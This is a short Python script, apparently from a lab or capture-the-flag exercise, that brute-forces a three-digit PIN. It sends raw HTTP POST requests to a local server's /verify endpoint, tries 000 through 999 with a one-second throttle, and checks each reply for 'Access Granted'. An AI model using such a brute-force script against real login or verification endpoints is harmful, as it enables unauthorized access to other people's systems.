import socket

HOST = '192.168.1.10' # my ip 
PORT = 8888 # server port

# FUNCTION- My request to the server, my arguments. The headers and changes
def create_request(pin):
    pin_str = f"{pin:03d}" # To convert single and double digits to 3 digits, filling with zeros (sample from 1 to 001)
    body = f"magicNumber={pin_str}" # Gives the PIN value

    # Headers inputs, the typical header inputs
    headers = (
        "POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return headers + body, pin_str 

# FUCNTION- This is the request to access the server. Creating connection between me and the server
def send_request(request):

    try:
        sock = socket.create_connection((HOST, PORT)) # creates the connection, using my address and the server port
        sock.sendall(request.encode()) # my requests are encoded to bytes so the computer can read it
        response = b"" # my container for the server response, it uses the b string so it collects bytes objects

        ''' 
        infinite loop to receive 4000 bytes of data
        basically, it starts from chunk = 0, then if the condition is not satisfied it 
        iterates, so the next value will be chunk = 1
        '''
        while True:
            chunk = sock.recv(4096) # the data received
            if not chunk: # condition that breaks out of the loop if there no more data or response from the server
                break
            response += chunk # pang iterate and store to container, literal meaning is response = response + chunk
        sock.close() # close connection :D


        # Connecting to a random address for 1 second to delay
        dummy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dummy_sock.settimeout(1)  # Wait for 1 second doing nothing
        try:
            dummy_sock.connect(("10.255.255.1", 12345))  # Random address to access, to delay
        except:
            pass
        dummy_sock.close()

        return response
    except:
        return None

# FUNCTION-  main function, this is the first function to run, this initializes the other functions and their parameters
            #the requests functions are called here
def main():
    for pin in range(1000): # The loop for the continuous attempts (starts with 0 - 999)
        request, pin_str = create_request(pin) # This is the variable that gives the PIN number for each attempts to the create_request function
        response = send_request(request) # Sends request and receives the server reply for each attempts
        if response:
            decoded = response.decode(errors="ignore")
            if "Access Granted" in decoded:
                print(f"SUCCESS! PIN: {pin_str}")
                print(decoded)
                break
            else:
                print(f"Trying PIN {pin_str}") # this prints if the PIN is incorrect
        else:
            print(f"No response for PIN {pin_str}")

# 
if __name__ == "__main__":
    main()
